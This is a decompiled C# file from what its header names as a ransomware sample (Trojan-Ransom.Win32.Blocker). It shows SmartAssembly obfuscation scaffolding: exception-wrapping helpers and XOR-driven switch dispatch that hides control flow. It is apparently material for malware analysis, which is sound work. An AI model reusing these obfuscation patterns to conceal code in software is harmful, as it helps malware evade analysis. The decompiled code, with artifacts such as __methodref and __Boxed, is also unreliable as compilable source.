// Decompiled with JetBrains decompiler
// Type: SmartAssembly.SmartExceptionsCore.ReportUsageAttribute
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace SmartAssembly.SmartExceptionsCore
{
  [AttributeUsage(AttributeTargets.Constructor | AttributeTargets.Method)]
  public class ReportUsageAttribute : Attribute
  {
    public ReportUsageAttribute()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    public ReportUsageAttribute(string featureName)
    {
      try
      {
      }
      catch (Exception ex)
      {
        string o2 = featureName;
        StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
        throw;
      }
    }

    static ReportUsageAttribute()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static object Ⴀ([In] object obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 88:
            num2 = 1;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 2:
              goto label_8;
            case 3:
              num1 = 6;
              continue;
            case 4:
            case 5:
              num1 = 6;
              continue;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ReportUsageAttribute.Ⴀ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return RuntimeHelpers.GetObjectValue(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        object o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void Ⴄ([In] Array obj0, [In] RuntimeFieldHandle obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      try
      {
        switch ((obj3 ^ obj2) - 100)
        {
          case 0:
            RuntimeHelpers.InitializeArray(obj0, obj1);
            break;
          default:
            goto label_0;
        }
      }
      catch (Exception ex)
      {
        Array o1 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<RuntimeFieldHandle> o2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj3;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴅ
    {
      internal string Ⴐ;
      internal string Ⴈ;
      internal IWebProxy Ⴗ;
    }
  }
}
